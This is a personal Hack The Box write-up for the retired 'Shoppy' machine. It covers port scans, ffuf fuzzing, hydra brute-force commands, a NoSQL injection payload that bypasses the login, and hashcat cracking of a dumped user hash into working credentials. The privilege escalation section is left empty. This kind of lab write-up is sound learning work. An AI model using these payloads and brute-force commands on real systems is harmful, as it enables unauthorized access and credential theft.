Box by [lockscan](https://app.hackthebox.com/users/217870)
{:.faded}

Retired box, available [here](https://app.hackthebox.com/machines/496)  
It's not my first box, I've done a few others before, but I neglected to write a walkthrough for them. That being said, I'm still a newbie, or, as some might say, a "script kiddie". That's okay; learning takes time, but it's worth it.

## Port scanning

### Initial scan

I'm trying [rustscan](https://github.com/RustScan/RustScan) for the first time on this box, instead of the well-known [nmap](https://nmap.org/).  
I'm feeling confident, so I'm starting with:

```bash
rustscan -a 10.10.11.180 --  -sV --open -oA /nmap/initial/initial_scan 
```
```plain
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    syn-ack ttl 62 nginx 1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Interesting, we get the common services: a **webpage** and **SSH**. From my experience, the SSH service allows us to connect using credentials we obtain from the webpage.
{:.note title="💭 Thoughs"}

I noticed `9093` port appearing once. I persisted.

```bash
rustscan -a 10.10.11.180 -p 9093 --  -sV -oA /nmap/initial/initial_scan
```
```plain
9093/tcp open  copycat? syn-ack ttl 62

```

I'm not sure what copycat is 😅. Let's see if we can get a banner or something.
{:.note title="💭 Thoughs"}

```bash
telnet 10.10.11.180 9093
```

Nothing to report, but I have bigger fish to fry. I took a look at the exploits available for the versions of `nginx` and `OpenSSH`, but didn't find anything particularly interesting. Here are my findings:

* [Nginx (no RCE)](https://www.tenable.com/plugins/was/113421)
* [OpenSSH has a RCE vuln](https://www.cybersecurity-help.cz/vdb/SB2021031404) but it requires to trick the users on the server side, useless here.

I'm eager to open my browser and get going, but first, let's do some more thorough scans.


### Full scan

Let's do a full scan. It's an easy VM, so I doubt we'll find anything. But, you never know!

```bash
rustscan -a 10.10.11.180 --range 1-65535 -T 2000 -- --open -oA /nmap/full/full_tcp_scan
```

Nothing more! I have other scans to run, though.

### Script scans

To be honest, those scripts never helped me, but `nmap` is really famous for it, so let's take it as a habit. To make it work, I'll probably have to follow the redirections of the webpage. I already got it in another box, so I added the DNS entry `shoppy.htb` to `/etc/hosts` and continued with my scan.

First, I fired the standard scripts set.

```bash
rustscan -t 5000 -a shoppy.htb -p 22,80,9093 -- -sC -oA /nmap/scripts/script_scan
```
```plain
22/tcp   open  ssh     syn-ack ttl 62
80/tcp   open  http    syn-ack ttl 62
|_http-favicon: Unknown favicon MD5: D5F0A0ADD0BFBB2BC51607F78ECE2F57
| http-methods:

|_http-title:             Shoppy Wait Page        
9093/tcp open  copycat syn-ack ttl 62
```

Nothing particularly interesting is happening right now.
{:.note title="💭 Thoughs"}

Then, I run the vulnerability scripts:

```bash
rustscan -t 5000 -a shoppy.htb -p 22,80,9093 --  -oA /nmap/scripts/script_scan --script vuln
```
```
PORT     STATE SERVICE REASON

```

This one is more interesting. As expected, the 22 port is likely not our entry point, but the web server appears to be more promising.
{:.note title="💭 Thoughs"}

What We Learned:

- There is a `/login/` page
- Most of the scripts failed
- There is a vulnerability that allows for a DDOS attack, but we will not be testing it here.

Therefore, let's continue with the `auth` scripts.

```bash
rustscan -t 5000 -a shoppy.htb -p 22,80,9093 --  -oA /nmap/scripts/script_scan --script auth
```
```plain
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 62

80/tcp   open  http    syn-ack ttl 62
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
9093/tcp open  copycat syn-ack ttl 62
```

No obvious open doors here 😢.   
Let's give our `exploit` scripts a try.

```bash
rustscan -t 5000 -a shoppy.htb -p 22,80,9093 --  -oA /nmap/scripts/script_scan --script exploit
```
```plain
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 62
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    syn-ack ttl 62
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
9093/tcp open  copycat syn-ack ttl 62
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
```

No, it won't be simple! 😈

### Enum HTTP

Let's delve deeper into the HTTP service and learn more about what it offers:

```bash
rustscan -t 5000 -a shoppy.htb -p 80 -- -sV --script=http-enum -oA /nmap/enum/nmap_http_enum
```
```plain
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 62 nginx 1.23.1
| http-enum: 
|_  /login/: Login page
|_http-server-header: nginx/1.23.1
```

We already know that, but let's see what it looks like!

![Full-width image](/assets/img/box/shoppy/homepage.png){:.lead width="800" height="100" loading="lazy"}

The homepage is just a countdown, nothing to see there...
{:.figcaption}

![Full-width image](/assets/img/box/shoppy/loginpage.png){:.lead width="800" height="100" loading="lazy"}

A login page. `admin:admin` don't work
{:.figcaption}

### Enum SSH

I no longer have faith in this, but let's be thorough.

```bash
rustscan -t 5000 -a shoppy.htb -p 22 -- -sV --script=ssh-* -oA /nmap/enum/nmap_http_enum
```

Nothing interesting.

### Scans wrap up

| Open Port | Software and version                          | Exploit |
|-----------|:----------------------------------------------|:-------:|
| 80        | nginx 1.23.1                                  | No      |
| 22        | OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | No      |
| 9093      | Copycat ??                                    | No      |

## Foothold

### Attempt #1: FFUF

Without any hint for the username nor the password I decide to use `FFUF` to discover some hidden places there

First let's try with the subdomains.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://shoppy.htb:80/ -H 'Host: FUZZ.shoppy.htb' -fs 169
```

Found nothing.
It's a bit overkill since we only have one page but I want to practice a bit, and use `FFUF` to find an eventual **index** page.

> Is it obvious that I just finished the `FFUF` module on [HackTheBox Academy](https://academy.hackthebox.com) 🤓 ?

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://shoppy.htb:80/login/indexFUZZ;
```

Nothing.
Ok, now let's try to find some hidden pages:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://shoppy.htb:80/FUZZ -recursion -recursion-depth 1 -ic -v;
```

We get some hits but nothing we didn't know / interesting:

* [http://shoppy.htb:80/](http://shoppy.htb/)
* [http://shoppy.htb:80/login](http://shoppy.htb/login)
* [http://shoppy.htb:80/admin](http://shoppy.htb/admin) (redirects to login)
* [http://shoppy.htb:80/assets/img](http://shoppy.htb/assets/img)
* [http://shoppy.htb:80/assets/css](http://shoppy.htb/assets/css)
* [http://shoppy.htb:80/assets/js](http://shoppy.htb/assets/js)
* [http://shoppy.htb:80/assets/fonts](http://shoppy.htb/assets/fonts)
* [http://shoppy.htb:80/assets/bootstrap](http://shoppy.htb/assets/bootstrap)

The only page of interest seems to be `/login`
{:.note title="💭 Thoughs"}

I tried to look for GET and/or POST parameter without any luck.
At this point I was wondering if I should try to bruteforce the login.

At the beginning I considered the following

```bash
hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt -f shoppy.htb -s 80 http-post-form '/login:username=^USER^&password=^PASS^:F=<p style="color: red;">Wrong Credentials</p>'
```

But I changed my mind it would take ages. Maybe we can try with something more specific, `admin` as an user maybe?

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f shoppy.htb -s 80 http-post-form "/login:username=^USER^&password=^PASS^:F=WrongCredentials"
```

No hits 😢.  
Out of idea for this attempt.

### Attempt #2: Copycat

We found in our scans that another port is open and identified as `copycat`, maybe it's time to have a closer look?
After a quick look on the web I found this [project](https://github.com/vegardit/copycat), it's an alpha project, seems similar to SMB and uses robocopy 🤔.

I clone the repo and create a config file:

```yaml
# sync tasks
sync:
- source: /home/jerome/footholder/test
  target: \\10.10.11.180:9093\
```

Then ran

```bash
sudo ./copycat-linux-amd64 sync --config config.yaml
```

and got:

```plain

        at com.vegardit.copycat.CopyCatMain.main(CopyCatMain.java:124)
```

Pfff… Anyway, nmap recognised it and it’s not a known software, maybe I missed a banner?
{:.note title="💭 Thoughs"}

Actually it looks like `prometheus` metrics

```bash
# TYPE go_gc_duration_seconds summary
go_gc_duration_seconds{quantile="0"} 4.1758e-05
go_gc_duration_seconds{quantile="0.25"} 0.000120456
go_gc_duration_seconds{quantile="0.5"} 0.000153307
go_gc_duration_seconds{quantile="0.75"} 0.000205976
go_gc_duration_seconds{quantile="1"} 0.000562215
go_gc_duration_seconds_sum 0.154520723
go_gc_duration_seconds_count 885
```

It's consistent with the [prometheus port](https://www.speedguide.net/port.php?port=9093), how did I missed that, It's not like I don't use regularly `prometheus`... So frustrating! 😡

### Attempt #3: The hidden subdomain

Here I have to admit... Out of ideas, I cheated and went on the forum to ask for help 😶.
I saw that I missed a subdomain, and should use another list.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://shoppy.htb:80/ -H 'Host: FUZZ.shoppy.htb' -fs 169
```

I found http://mattermost.shoppy.htb/login
Let's see if we can't find other pages there

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://mattermost.shoppy.htb:80/FUZZ -recursion -recursion-depth 1 -ic -v;
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://mattermost.shoppy.htb:80/FUZZ -recursion -recursion-depth 1 -ic -v;
```

Found 

- http%3A%2F%2Fwww
- http%3A%2F%2Fyoutube
- http%3A%2F%2Fblogs
- http%3A%2F%2Fblog
- *http%3A%2F%2Fwww

But we always get redirected on login page.  
Then I try to find some GET parameters

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://mattermost.shoppy.htb/login/?FUZZ=key -fs xxx
```

Nothing on GET...  
Let's try with POST

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://mattermost.shoppy.htb/login/ -X POST -d 'FUZZ=key' -fs 3122,0
```

Nothing on POST neither.
Maybe we can use the reset password page

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://mattermost.shoppy.htb/reset_password/?FUZZ=key -fs 3122
```
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://mattermost.shoppy.htb/reset_password/ -X POST -d 'FUZZ=key' -fs 3122,0
```

Again, we don't find anything.
Let's try to bruteforce...

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f mattermost.shoppy.htb -s 80 http-post-form '/api/v4/users/login:{"device_id":"","login_id":"\^USER\^","password":"\^PASS\^","token":""}:Enter'
```

Nope, failed, damn! 😰

### Attempt #4: NoSQL injection

At this point I was, again, totally stuck. Didn't found any vunl we could use with `mattermost` neither. So... I cheated again and asked for help on the forum!
I saw that I missed a NoSQL injection on the first page [http://shoppy.htb:80/login](http://shoppy.htb/login)!  

> Here is the thing: I don't know shit about SQL/NoSQL injections. 🤦‍♂️  
Time to go back to school 🎓... I did the [NoSQL Injection module on HTB Academy](https://academy.hackthebox.com/module/details/171).

After some intensive learning sessions, I'm back and ready to inject!  
First, I want to confirm that the form is vulnerable and try the following payload in `username`

```plain
'"\/$[].>
```

It seems to crash 💥: it creates a infinite loading.  
Trying one by one, I discover that the it's `'` that is guilty.  
At last I'm lucky because my first try is the good one: `' || true || ''=='` allows us to connect!


![Full-width image](/assets/img/box/shoppy/adminpage.png){:.lead width="800" height="100" loading="lazy"}

At least! We are in 🚀
{:.figcaption}

The page itself is not really interesting except for the `Search for users` button:

![Full-width image](/assets/img/box/shoppy/searchusers.png){:.lead width="800" height="100" loading="lazy"}

Maybe we can find some credentials for mattermost? 🕵️
{:.figcaption}

Let's try with `admin`  
Yes we get a json containing very intersting informations:

```json
[
  {
    "_id":"62db0e93d6d6a999a66ee67a",
    "username":"admin",
    "password":"23c6877d9e2b564ef8b32c3a23de27b2"
  }
]
```

Really cool right? The password is probably hashed but I tried to login with it on [http://mattermost.shoppy.htb/login/](http://mattermost.shoppy.htb/login/).  
Of course it didn't work...

### Attempt #5: Hashcat

The hash is probably salted, let's ask `hashcat`

```bash
hashcat 23c6877d9e2b564ef8b32c3a23de27b2:admin

Damned you `hashcat`, pick a line! 😡
Well I'm too lazy to test it all manually, let's make a script, plug the laptop and get out to see the sun and make a walk ☀️

```bash
for i in 10 20 3800 3710 4110 4010 21300 40 3910 4410 21200 30 50 60 1100 12 2811 2611 2711 23; do
	echo $i && hashcat hash -m $i -O /usr/share/wordlists/rockyou.txt | grep "Recovered"
done
```

Once back I'm happy to see that... everything failed!

### Attempt #6: FFUF again

Maybe this `admin` is too hard to be cracked using a list and bruteforcing it is not the point...
Let's see if I can find another user.

To be honest, I saw that the form is probably vulnerable to another injection but I did not managed to find a way to do it 😰...
I got another idea, let's re-use `FFUF`!

First I intercepted a request with `burp` to get the cookie 🍪
Then reused it with `FFUF`

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://shoppy.htb/admin/search-users?username=FUZZ \
-H $'Host: shoppy.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://shoppy.htb/admin/search-users?username=test' -H $'Upgrade-Insecure-Requests: 1' -H $'If-None-Match: W/\"a01-ISB6B7RD1nACsgg42wliEwlfq2U\"' \

```

No luck

Find you my little bastard! Say hello to `Josh`

> I think I've been really, really, really lucky here because I didn't rate limited `FFUF` and got a lot of 500 that I filtered out. If `josh` returned a 500 I would missed it! 🍀

Getting Josh's `json`:

```json
[
  {
    "_id":"62db0e93d6d6a999a66ee67b",
    "username":"josh",
    "password":"6ebcea65320589ca4f2f1ce039975995"
  }
]
```

And back to `Hashcat` that don't really guess the hash type:

```plain
		900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)
```

Re-using the same script and grabbing a coffee ☕️

```bash
for i in 900 0 70 2600 3500 4400 20900 4300 1000 9900 8600; do
	echo $i && hashcat "6ebcea65320589ca4f2f1ce039975995" -m $i -O /usr/share/wordlists/rockyou.txt | grep "Recovered"
done
```

This time we get a hit! It's a MD5

```bash
hashcat "6ebcea65320589ca4f2f1ce039975995" -m 0 -O /usr/share/wordlists/rockyou.txt | grep "Recovered" --show
```

Got you Josh! `josh:remembermethisway`

## Privilege escalation



## Wrap Up

This easy box took me ages, I *cheated* 2x asking for help and get hints but at least I learned a lot!
Here are the lessons I learned with this box

* NoSQL injections
* Use specialised lists for certain tasks when blocked eg: bitquark-subdomains-top100000.txt in DNS for subdomains.
* Rate limit FFUF when you get 500 errors, use `-ac`
